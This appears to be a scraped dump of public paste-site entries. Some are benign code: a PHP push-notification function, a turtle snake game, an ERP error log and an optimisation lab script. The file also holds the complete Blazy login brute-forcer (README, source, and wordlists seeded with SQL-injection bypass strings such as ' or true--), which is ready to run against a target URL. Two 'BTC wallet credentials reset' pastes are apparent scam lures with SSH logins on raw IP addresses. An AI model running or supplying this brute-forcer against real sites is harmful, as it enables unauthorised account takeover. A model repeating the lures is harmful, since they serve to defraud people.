id,title,username,language,date,content
3LgRHEm6,SendNotification - OneSignal,Sufyan,PHP,Thursday 23rd of November 2023 11:53:28 PM CDT,"    public function sendNotification($title = null, $description = null, $player_ids = [], $extra = []) {
      try {
        $http = new Client();
        $reqData = [
          'app_id' => env('ONESIGNAL_APP_ID'),
          // 'include_player_ids' => $player_ids,
          'include_external_user_ids' => $player_ids, //using 'Users.id'
          'contents' => [
            'en' => $description
          ],
          'headings' => [
            'en' => $title
          ]
        ];
  
        $reqData = array_merge($reqData, $extra);
        $resp = $http->post('https://onesignal.com/api/v1/notifications', json_encode($reqData),
          [
            'headers' => [
              'Content-Type' => 'application/json; charset=utf-8',
              'Authorization' => 'Basic '.env('ONESIGNAL_API_KEY')
            ]
          ]
        );
        return $resp;
      } catch (\Throwable $th) {
        throw $th;
      }
    }"
QKBjhPsB,BTC Wallet Credentials have been reset,VQ-Moe,GetText,Thursday 23rd of November 2023 11:33:07 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please contact us immediately.

Your new login credentials will be 
chefman440:Jmh3x9ZB on 149.28.231.183
You can connect via SSH.

Regards,
GM-352956"
ecx0CFNU,BTC Wallet Credentials have been reset,castlclass_20,GetText,Thursday 23rd of November 2023 11:25:58 PM CDT,"Dear User
We have received a request to reset the login information for your Bitcoin wallet. If you did not make this request, please disregard this message.
Your new login credentials will be 
yaendayowa:mj22XL on 212.224.93.130
You can connect via SSH.
Regards"
LxywyGvK,snake 2 from turtle,AlphaPenguino,Python,Thursday 23rd of November 2023 10:49:57 PM CDT,"import turtle
import time
import random

delay = 0.1
game_started = False

score = 0
hi_score = 100

wn = turtle.Screen()
wn.title(""THIS IS THE TITLE"")
wn.bgcolor(""blue"")
wn.setup(width=600, height=600)
wn.tracer(0)

#snake_head
head = turtle.Turtle()
head.speed(0)
head.shape(""triangle"")
head.color(""black"")
head.penup()
head.goto(0,0)
head.direction = ""stop""

segments = []

#food
food= turtle.Turtle()
food.speed(0)
food.shape(""circle"")
food.color(""green"")
food.penup()
food.goto(0,0)

#text
penText = turtle.Turtle()
penText.speed(0)
penText.shape(""square"")
penText.color(""white"")
penText.clear()
penText.penup()
penText.hideturtle()
penText.goto(0, 260)
penText.write(""Press spacebar to start!"", align=""center"", font=('Times New Roman', 25, ""bold""))

def move_up():
    if head.direction != ""down"":
        head.direction = ""up""

def move_down():
    if head.direction != ""up"":
        head.direction = ""down""

def move_left():
    if head.direction != ""right"":
        head.direction = ""left""

def move_right():
    if head.direction != ""left"":
        head.direction = ""right""

def move():
    if head.direction == ""up"":
        head.sety(head.ycor() + 20)
        head.setheading(90)
    if head.direction == ""down"":
        head.sety(head.ycor() - 20)
        head.setheading(270)
    if head.direction == ""left"":
        head.setx(head.xcor() - 20)
        head.setheading(180)
    if head.direction == ""right"":
        head.setx(head.xcor() + 20)
        head.setheading(0)

    for segment in segments:
        if segment.distance(head) < 20:
            time.sleep(1)
            head.goto(0, 0)
            head.direction = ""stop""

            for segment in segments:
                segment.goto(1000, 1000)




def placeFood():
    food.hideturtle()
    food.setx(random.randint(-270, 270))
    food.sety(random.randint(-270, 270))
    food.showturtle()

def gameOver(score, hi_score):
    penText.clear()
    penText.write(""Score: {} Hi-score: {}"".format(score-5, hi_score), align=""center"",
                          font=(""Consolas"", 25, ""bold""))
    turtle.clear()
    turtle.penup()
    turtle.color(""white"")
    turtle.write(""GAME OVER!"", align=""center"", font=(""Comic Sans MS"", 25, ""bold""))

    turtle.hideturtle()
    head.goto(1000,1000)
    head.color(""blue"")
    head.direction = ""stop""
    food.goto(500,500)





def startGame():
    global game_started, delay, score, hi_score
    if game_started:
        return
    game_started = True
    penText.clear()


    while True:
        wn.update()
        if head.distance(food) < 20:
            placeFood()
            newSegment = turtle.Turtle()
            newSegment.speed(0)
            newSegment.shape(""circle"")
            newSegment.color(""white"")
            newSegment.penup()
            segments.append(newSegment)

            if score > hi_score:
                hi_score = score

            penText.clear()
            penText.write(""score: {}  Hi-score: {}"".format(score, hi_score), align=""center"",
                          font=(""Consolas"", 25, ""bold""))
            delay -= 0.001
            score += 5

        for i in range(len(segments)-1, 0, -1):
            segments[i].setx(segments[i-1].xcor())
            segments[i].sety(segments[i-1].ycor())

        if len(segments) > 0:
            segments[0].goto(head.xcor(), head.ycor())


        #collision
        if int(head.xcor()) > 290 or int(head.xcor()) < -290 or int(head.ycor()) > 290 or int(head.ycor()) < -290:

            time.sleep(0)
            game_started = False
            gameOver(score, hi_score)

        move()



        time.sleep(delay)



wn.listen()
wn.onkeypress(move_up, ""w"")
wn.onkeypress(move_down, ""s"")
wn.onkeypress(move_left, ""a"")
wn.onkeypress(move_right, ""d"")
wn.onkeypress(startGame, ""space"")


wn.mainloop()"
keHpeqXc,msg_details_rg_queue,abirama62,JSON,Thursday 23rd of November 2023 10:38:08 PM CDT,"{
  ""action"": ""executeTrigger"",
  ""nextTrigger"": ""ApprovedReceiveGoodsPostEventFired"",
  ""schema"": ""memeflorist"",
  ""tenantId"": 10,
  ""data"": {
    ""date"": ""20231122"",
    ""scheme"": ""CB01"",
    ""data"": ""{\""createUserId\"":31,\""updateUserId\"":31,\""workflowStatus\"":\""DRAFT\"",\""docDate\"":\""20231122\"",\""remark\"":\"" pf sby-Living4u\"",\""docNo\"":\""RG-MF/2311/001337\"",\""version\"":0,\""createDateTime\"":\""20231123093551\"",\""ouId\"":11,\""warehouseId\"":11,\""docTypeId\"":111,\""tenantId\"":10,\""id\"":48540,\""refId\"":48013,\""partnerId\"":46888,\""refDocTypeId\"":101,\""statusDoc\"":\""D\"",\""updateDateTime\"":\""20231123093551\"",\""extDocNo\"":\""-\"",\""extDocDate\"":\""20231122\""}"",
    ""roleId"": 34,
    ""docId"": 48540,
    ""remark"": ""MEG-PO-2311/000393\r\n"",
    ""label"": ""rcvgoodsRG-MF/2311/001337"",
    ""docNo"": ""RG-MF/2311/001337"",
    ""userId"": 31,
    ""param"": {
      ""autonumDocDate"": ""20231122"",
      ""autonumDocData"": ""{\""createUserId\"":-1,\""code\"":\""Mega\"",\""updateUserId\"":-1,\""active\"":\""Y\"",\""version\"":0,\""parentId\"":-99,\""createDateTime\"":\""20210727102622\"",\""activeDateTime\"":\""20210727102622\"",\""nonActiveDateTime\"":\"" \"",\""tenantId\"":10,\""name\"":\""CV Mega Multi Kreasi\"",\""typeId\"":10,\""id\"":11,\""updateDateTime\"":\""20210727102622\""}"",
      ""receiveGoodsId"": 48540,
      ""userId"": 31,
      ""datetime"": ""20231123093557"",
      ""tenantId"": 10
    },
    ""tenantId"": 10,
    ""action"": ""SUBMIT"",
    ""flgUserRole"": ""U"",
    ""nextState"": ""APPROVED"",
    ""id"": ""899b760b-f18b-4297-8b78-d4e2d0080d22"",
    ""timestamp"": 1700706957534
  },
  ""_error"": ""org.springframework.transaction.UnexpectedRollbackException: Transaction silently rolled back because it has been marked as rollback-only\n\tat org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:755)\n\tat org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:714)\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.completeTransactionAfterThrowing(TransactionAspectSupport.java:568)\n\tat org.springframework.transaction.interceptor.TransactionAspectSupport.invokeWithinTransaction(TransactionAspectSupport.java:299)\n\tat org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:98)\n\tat org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:186)\n\tat org.springframework.aop.framework.CglibAopProxy$DynamicAdvisedInterceptor.intercept(CglibAopProxy.java:688)\n\tat org.jleaf.erp.purch.services.receivegoods.triggers.ApprovedReceiveGoodsPostEventFiredExecute$$EnhancerBySpringCGLIB$$c90f1b15.execute(<generated>)\n\tat org.jleaf.erp.purch.services.receivegoods.triggers.ApprovedReceiveGoodsPostEventFired.execute(ApprovedReceiveGoodsPostEventFired.java:44)\n\tat org.jleaf.workflow.core.processor.ApprovedProcessor.process(ApprovedProcessor.java:97)\n\tat org.jleaf.workflow.core.engine.WorkflowExecutor.completeRequest(WorkflowExecutor.java:575)\n\tat org.jleaf.workflow.core.engine.WorkflowExecutor.complete(WorkflowExecutor.java:94)\n\tat org.jleaf.serviceflow.task.SubmitApprovalTask.executeComplete(SubmitApprovalTask.java:166)\n\tat org.jleaf.serviceflow.task.CallBtTask.execute(CallBtTask.java:85)\n\tat org.jleaf.serviceflow.impl.DefaultServiceFlowExecutor.execute(DefaultServiceFlowExecutor.java:96)\n\tat org.jleaf.service.boot.core.proxy.TaskProxyProcessor.execute(TaskProxyProcessor.java:79)\n\tat org.jleaf.service.boot.core.AbstractJsonProxyProcessor.process(AbstractJsonProxyProcessor.java:43)\n\tat org.jleaf.service.boot.core.controller.v1.ServiceController.task(ServiceController.java:51)\n\tat sun.reflect.GeneratedMethodAccessor85.invoke(Unknown Source)\n\tat sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)\n\tat java.lang.reflect.Method.invoke(Method.java:498)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.doInvoke(InvocableHandlerMethod.java:190)\n\tat org.springframework.web.method.support.InvocableHandlerMethod.invokeForRequest(InvocableHandlerMethod.java:138)\n\tat org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod.invokeAndHandle(ServletInvocableHandlerMethod.java:104)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.invokeHandlerMethod(RequestMappingHandlerAdapter.java:892)\n\tat org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerAdapter.handleInternal(RequestMappingHandlerAdapter.java:797)\n\tat org.springframework.web.servlet.mvc.method.AbstractHandlerMethodAdapter.handle(AbstractHandlerMethodAdapter.java:87)\n\tat org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1039)\n\tat org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942)\n\tat org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:1005)\n\tat org.springframework.web.servlet.FrameworkServlet.doPost(FrameworkServlet.java:908)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:660)\n\tat org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:882)\n\tat javax.servlet.http.HttpServlet.service(HttpServlet.java:741)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:231)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:53)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.JwtLoginFilter.doFilter(JwtLoginFilter.java:49)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.JwtTaskFilter.doFilter(JwtTaskFilter.java:53)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.MultiTenantFilter.doFilter(MultiTenantFilter.java:38)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.ProtectPathFromPublicFilter.doFilter(ProtectPathFromPublicFilter.java:35)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.jleaf.service.boot.core.httpfilter.AllowCORSFilter.doFilter(AllowCORSFilter.java:48)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.RequestContextFilter.doFilterInternal(RequestContextFilter.java:99)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.FormContentFilter.doFilterInternal(FormContentFilter.java:92)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.HiddenHttpMethodFilter.doFilterInternal(HiddenHttpMethodFilter.java:93)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200)\n\tat org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:118)\n\tat org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\n\tat org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)\n\tat org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:202)\n\tat org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:96)\n\tat org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:490)\n\tat org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:139)\n\tat org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)\n\tat org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:74)\n\tat org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)\n\tat org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:408)\n\tat org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)\n\tat org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:853)\n\tat org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1587)\n\tat org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)\n\tat java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)\n\tat java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)\n\tat org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)\n\tat java.lang.Thread.run(Thread.java:748)\n""
}"
F4NMxWw0,lobos_lab10,andreerival,Python,Thursday 23rd of November 2023 10:35:26 PM CDT,"import random
import math
import matplotlib.pyplot as plt
import numpy as np
from tqdm import tqdm
import os
 
def easom_function(x):
    if len(x) != 2:
        raise(ValueError, ""Easom takes exactly two values"")
    return -math.cos(x[0]) * math.cos(x[1]) * math.exp(-(x[0] - math.pi)**2 - (x[1] - math.pi)**2)
 
def shubert_function(x):
    if len(x) != 2:
        raise(ValueError, ""Shubert takes exactly two values"")
    term1 = 0
    term2 = 0
    for i in range(1, 6):
        term1 += i * math.cos((i + 1) * x[0] + i)
        term2 += i * math.cos((i + 1) * x[1] + i)
    result = term1 * term2
    return result
 
def rosenbrock_function(x):
    add = 0
    for i in range(len(x)-1):
        add += 100 * (x[i + 1] - x[i]**2)**2 + (1 - x[i])**2
    return add
 
def lobo_gris(function, num_lobos, max_iterations, lower_bound, upper_bound, objective_minimum, dimensions, tolerancy):
    # Inicializar la manada de lobos
    manada = np.random.uniform(low=lower_bound, high=upper_bound, size=(num_lobos, dimensions))
    aptitudes = np.apply_along_axis(function, 1, manada)
    
    # Inicializar el mejor valor y la mejor posición
    best_aptitud = np.min(aptitudes)
    best_position = manada[np.argmin(aptitudes)]
    
    for iteracion in range(max_iterations):
        # Ordenar lobos por aptitud
        manada = manada[np.argsort(aptitudes)]
        
        # Encontrar los 3 mejores lobos
        x_alfa = manada[0] 
        x_beta = manada[1]
        x_delta = manada[2]
        
        a = 2 - iteracion * (2/max_iterations) # Actualizar parámetro a
        
        for i in range(num_lobos):
            # Actualizar posiciones 
            for d in range(dimensions):
                x_1 = x_alfa[d] + random.uniform(-a, a)
                x_2 = x_beta[d] + random.uniform(-a, a) 
                x_3 = x_delta[d] + random.uniform(-a, a)
                
                x_nuevo = (x_1 + x_2 + x_3)/3
                
                # Asegurarse de que la nueva posición esté dentro de los límites
                x_nuevo = max(min(x_nuevo, upper_bound), lower_bound)
                
                manada[i][d] = x_nuevo
            
            # Evaluar nuevas aptitudes
            aptitudes[i] = function(manada[i])
            
            # Verificar nuevo óptimo
            if aptitudes[i] < best_aptitud:
                best_aptitud = aptitudes[i]
                best_position = manada[i]
        
        # Revisar criterio de parada 
        if abs(best_aptitud - objective_minimum) <= tolerancy:
            return True, iteracion + 1, best_position, best_aptitud
    
    return False, max_iterations, best_position, best_aptitud


    
 
def mean(list):
    add = 0
    for elem in list:
        add += elem
    return add / len(list)
 
def std(lista):
    n = len(lista)
    if n < 2:
        return 0  # La desviación estándar no se puede calcular con menos de dos elementos
 
    media = sum(lista) / n
    suma_de_cuadrados = sum((x - media) ** 2 for x in lista)
    desviacion_estandar = (suma_de_cuadrados / (n - 1)) ** 0.5
    return desviacion_estandar
 
def printTable(database):
    print(""-"" * 38)
    print(f""| {'Función':^12} | {'WOLF':^19} |"")
    print(""-"" * 38)
 
    for funcion, datos in database:
        print(f""| {funcion:^12} | {datos:^19} |"")
    print(""-"" * 38)
 
functions = []
 
num_lobos = 200
max_iterations = 1000
epsilon = 1e-3
executions = 50

easom = {
    'name': 'easom',
    'function': easom_function,
    'objective_minimum': -1,
    'lower_bound': -math.pi,
    'upper_bound': math.pi,
    'dimensions': 2,
    'presition': epsilon
}
 
shubert = {
    'name': 'shubert',
    'function': shubert_function,
    'objective_minimum': -186.7309,
    'lower_bound': -10,
    'upper_bound': 10,
    'dimensions': 2,
    'presition': 1
}
 
rosenbrock = {
    'name': 'rosenbrock',
    'function': rosenbrock_function,
    'objective_minimum': 0,
    'lower_bound': 1, 
    'upper_bound': 1.5,
    'dimensions': 2,
    'presition': epsilon
}
 
functions.append(easom)
functions.append(shubert)
functions.append(rosenbrock)
 
print(""="" * 40)
print(""\t    Using..."")
print(f""\t{num_lobos} lobos"")
print(f""\t{max_iterations} iteraciones maximas"")
print(f""\t{executions} ejecuciones"")
print(f""\t{epsilon} de precision"")
print(""="" * 40)
results = []
 
# Crea un directorio para guardar las gráficas si no existe
output_directory = 'graphs'
os.makedirs(output_directory, exist_ok=True)
 
# To save the minimums
best_values = {
    'easom': float('inf'),
    'shubert': float('inf'),
    'rosenbrock': float('inf'),
}
 
for funct in functions:
    # Inicializa una lista para guardar las mejores posiciones de cada iteración
    best_positions_history = []

    # Crea una barra de progreso
    progress_bar = tqdm(total=executions, desc=funct['name'])

    # Contador de ejecuciones correctas
    correct_executions = 0
    iterations = []

    for execution in range(executions):
        achieved, iteration, best_position, best_value = lobo_gris(
            funct['function'], 
            num_lobos, 
            max_iterations, 
            funct['lower_bound'], 
            funct['upper_bound'], 
            funct['objective_minimum'], 
            funct['dimensions'], 
            funct['presition']
        )

        if achieved:
            correct_executions += 1
        if best_value < best_values[funct['name']]:
            best_values[funct['name']] = best_value
        iterations.append(iteration)
        progress_bar.update(1)

        # Guarda las mejores posiciones en cada iteración
        best_positions_history.append(best_position)

    # Cierra la barra de progreso
    progress_bar.close()

    # Anexamos resultados
    success_rate = (correct_executions * 100) / executions
    prom = mean(iterations)
    deviation = std(iterations)
    results.append((funct['name'], f""{int(prom)} ± {int(deviation)} ({success_rate}%)""))


    # Crea una gráfica para mostrar la evolución de la mejor posición para la función actual
    plt.figure()
    plt.xlabel('X')
    plt.ylabel('Y')
    plt.title(f'Evolución de la mejor posición para {funct[""name""]}')

    for i, best_position in enumerate(best_positions_history):
        x = best_position[0]  # Accede al valor x de la iteración actual
        y = best_position[1]  # Accede al valor y de la iteración actual
        plt.plot(x, y, '-o', label=f'Iteración {i + 1}', color='black', alpha=0.2)

    # Guarda la gráfica compuesta en un archivo PNG de alta calidad
    output_file = os.path.join(output_directory, f'{funct[""name""]}_evolution.png')
    plt.savefig(output_file, dpi=300, bbox_inches='tight')
    plt.close()

print("""")
printTable(results)
print(f""Best Easom Value: {best_values['easom']}"")
print(f""Best Shubert Value: {best_values['shubert']}"")
print(f""Best Rosenbrock Value: {best_values['rosenbrock']}"")
print(""\n\n"")"
YbAcn4fj,README,FlyFar,Email,Thursday 23rd of November 2023 10:17:41 PM CDT,"Blazy
Blazy is a modern login page bruteforcer.



Features
- Easy target selections
- Smart form and error detection
- CSRF and Clickjacking Scanner
- Cloudflare and WAF Detector
- 90% accurate results
- Checks for login bypass via SQL injection
- Multi-threading
- 100% accurate results
- Better form detection and compatibility

Requirements:
- Beautiful Soup
- Mechanize

Usages
Open your terminal and enter:
git clone https://github.com/UltimateHackers/Blazy

Now enter the following command:
cd Blazy

Lets install the required modules before running Blazy:
pip install -r requirements.txt

Now run Blazy by entering:
python blazy.py

Now enter your desired login page URL and Blazy will do its thing"
pvzgRFEr,usernames.txt,FlyFar,Email,Thursday 23rd of November 2023 10:15:37 PM CDT,"'or' '='
' or true--
root
admin
test
guest
info
adm
mysql
user
administrator
oracle
ftp"
DAZDA5b3,passwords.txt,FlyFar,Email,Thursday 23rd of November 2023 10:14:49 PM CDT,"'or' '='
' or true--
admin
123456
password
12345678
666666
111111
1234567
qwerty
siteadmin
administrator
root
123123
123321
1234567890
letmein123
test123
demo123
pass123
123qwe
qwe123
654321
loveyou
adminadmin123"
JLvcCY8F,blazy.py,FlyFar,Python,Thursday 23rd of November 2023 10:13:05 PM CDT,"#!/usr/bin/env python2
#Modules
import mechanize
import itertools
import cookielib
import sys
from bs4 import BeautifulSoup
from re import search, findall
from urllib import urlopen
from urllib2 import URLError
#Stuff related to Mechanize browser module
br = mechanize.Browser() #Shortening the call by assigning it to a varaible ""br""
# set cookies
cookies = cookielib.LWPCookieJar()
br.set_cookiejar(cookies)
# Mechanize settings
br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)
br.set_handle_robots(False)
br.set_debug_http(False)
br.set_debug_responses(False)
br.set_debug_redirects(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
# Banner
print """"""\033[1;37m    ____   _                    
   |  _ \ | |              
   | |_) || |  __ _  ____ _   _ 
   |  _ < | | / _` ||_  /| | | |
   | |_) || || (_| | / / | |_| |
   |____/ |_| \__,_|/___| \__, |
                           __/ |
    Made with \033[91m<3\033[37m By D3V\033[1;37m   |___/ 
    \033[0m""""""
url = raw_input('\033[1;34m[?]\033[0m Enter target URL: ') #takes input from user
if 'http://' in url:
    pass
elif 'https://' in url:
    url = url.replace('https://', 'http://')
else:
    url = 'http://' + url
try:
    br.open(url, timeout=10.0) #Opens the url
except URLError as e:
    url = 'https://' + url
    br.open(url)
forms = br.forms() #Finds all the forms present in webpage

headers = str(urlopen(url).headers.headers).lower() #Fetches headers of webpage
if 'x-frame-options:' not in headers:
    print '\033[1;32m[+]\033[0m Heuristic found a Clickjacking Vulnerability'
if 'cloudflare-nginx' in headers:
    print '\033[1;31m[-]\033[0m Target is protected by Cloudflare'
data = br.open(url).read() #Reads the response
if 'type=""hidden""' not in data:
    print '\033[1;32m[+]\033[0m Heuristic found a CSRF Vulnerability'

soup =  BeautifulSoup(data, 'lxml') #Pareses the response with beuatiful soup
i_title = soup.find('title') #finds the title tag
if i_title != None:
    original = i_title.contents #value of title tag is assigned to 'original'

def WAF_detector(): #WAF detection function
    noise = ""?=<script>alert()</script>"" #a payload which is noisy enough to provoke the WAF
    fuzz = url + noise
    res1 = urlopen(fuzz) #Opens the noise injected payload
    if res1.code == 406 or res1.code == 501: #if the http response code is 406/501
        print""\033[1;31m[-]\033[1;m WAF Detected : Mod_Security""
    elif res1.code == 999: #if the http response code is 999
        print""\033[1;31m[-]\033[1;m WAF Detected : WebKnight""
    elif res1.code == 419: #if the http response code is 419
        print""\033[1;31m[-]\033[1;m WAF Detected : F5 BIG IP""
    elif res1.code == 403: #if the http response code is 403
        print ""\033[1;31m[-]\033[1;m Unknown WAF Detected""
WAF_detector()

def wordlist_u(lst): #Loads usernames from usernames.txt
    try:
        with open('usernames.txt','r') as f:
            for line in f:
                final = str(line.replace(""\n"",""""))
                lst.append(final)
    except IOError:
        print ""\033[1;31m[-]\033[1;m Wordlist not found!""
        quit()
def wordlist_p(lst): #Loads passwords from passwords.txt
    try:
        with open('passwords.txt','r') as f:
            for line in f:
                final = str(line.replace(""\n"",""""))
                lst.append(final)
    except IOError:
        print""\033[1;31m[-]\033[1;m Wordlist not found!""
        quit()
usernames = []
wordlist_u(usernames)
print '\033[1;97m[>]\033[1;m Usernames loaded: %i'% len(usernames)
passwords = []
wordlist_p(passwords)
print '\033[1;97m[>]\033[1;m Passwords loaded: %i'% + len(passwords)
def find(): #Function for finding forms
    form_number = 0
    for f in forms: #Finds all the forms in the webpage
        data = str(f) #Converts the response recieved to string
        username = search(r'<TextControl\([^<]*=\)>', data) #Searches for fields that accept plain text

        if username: #if such field is found
            username = (username.group().split('<TextControl(')[1][:-3]) #Extractst the name of field
            print '\033[1;33m[!]\033[0m Username field: ' + username #prints name of field
            passwd = search(r'<PasswordControl\([^<]*=\)>', data) #Searchs for fields that accept password like text

            if passwd: #if such field is found
                passwd = (passwd.group().split('<PasswordControl(')[1][:-3]) #Extracts the field name
                print '\033[1;33m[!]\033[0m Password field: ' + passwd #prints name of field
                select_n = search(r'SelectControl\([^<]*=', data) #checks for other selectable menus in form
 
                if select_n: #if a menu is found
                    name = (select_n.group().split('(')[1][:-1]) #Extracts the menu name
                    select_o = search(r'SelectControl\([^<]*=[^<]*\)>', data) #select_o is the name of menu

                    if select_o: #Proceeds to find options of menu
                        menu = ""True"" #Sets the menu to be true
                        options = (select_o.group().split('=')[1][:-1]) #Extracts options
                        print '\n\033[1;33m[!]\033[0m A drop down menu detected.'
                        print '\033[1;33m[!]\033[0m Menu name: ' + name #prints menu name
                        print '\033[1;33m[!]\033[0m Options available: ' + options #prints available options
                        option = raw_input('\033[1;34m[?]\033[0m Please Select an option:>> ') #Gets option from user
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    else:
                        menu = ""False"" #No menu is present in the form
                        try:
                            brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                        except Exception as e:
                            cannotUseBruteForce(username, e)
                            pass							
                else:
                    menu = ""False"" #No menu is present in the form
                    option = """" #Sets option to null
                    name = """" #Sets name to null
                    try:
                        brute(username, passwd, menu, option, name, form_number) #Calls the bruteforce function
                    except Exception as e:
                       cannotUseBruteForce(username, e)
                       pass
            else:
                form_number = form_number + 1
                pass
        else:
            form_number = form_number + 1
            pass
    print '\033[1;31m[-]\033[0m No forms found'
def cannotUseBruteForce(username, e):
    print '\r\033[1;31m[!]\033[0m Cannot use brute force with user %s.' % username
    print '\r    [Error: %s]' % e.message	
def brute(username, passwd, menu, option, name, form_number):
    for uname in usernames:
        progress = 1
        print '\033[1;97m[>]\033[1;m Bruteforcing username: %s'% uname
        for password in passwords:
            sys.stdout.write('\r\033[1;97m[>]\033[1;m Passwords tried: %i / %i'% (progress, len(passwords)))
            sys.stdout.flush()
            br.open(url)  
            br.select_form(nr=form_number)
            br.form[username] = uname
            br.form[passwd] = password
            if menu == ""False"":
                pass
            elif menu == ""True"":
                br.form[name] = [option]
            else:
                pass
            resp = br.submit()
            data = resp.read()
            data_low = data.lower()
            if 'username or password' in data_low:
                pass
            else:
                soup =  BeautifulSoup(data, 'lxml')
                i_title = soup.find('title')
                if i_title == None:
                    data = data.lower()
                    if 'logout' in data:
                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
                        print uname
                        print password
                        quit()
                    else:
                        pass
                else:
                    injected = i_title.contents
                    if original != injected:
                        print '\n\033[1;32m[+]\033[0m Valid credentials found: '
                        print '\033[1;32mUsername: \033[0m' + uname
                        print '\033[1;32mPassword: \033[0m' + password
                        quit()
                    else:
                        pass
            progress = progress + 1
        print ''
    print '\033[1;31m[-]\033[0m Failed to crack login credentials'
    quit()
find()"
a2tCZfRy,Untitled,kingbode,Python,Thursday 23rd of November 2023 10:01:12 PM CDT,"import requests
from bs4 import BeautifulSoup
import json


response = requests.get('https://www.bilbasen.dk/brugt/bil/mercedes/b200-d/20-aut-5d/5973808')

if response.status_code == 200:
    soup = BeautifulSoup(response.text, 'html.parser')

    data = soup.find_all('script')[-1].text.strip().replace('var _props = ', '').replace(';', '')

    jsonData = json.loads(data)['listing']['media']['images']
    for d in jsonData:
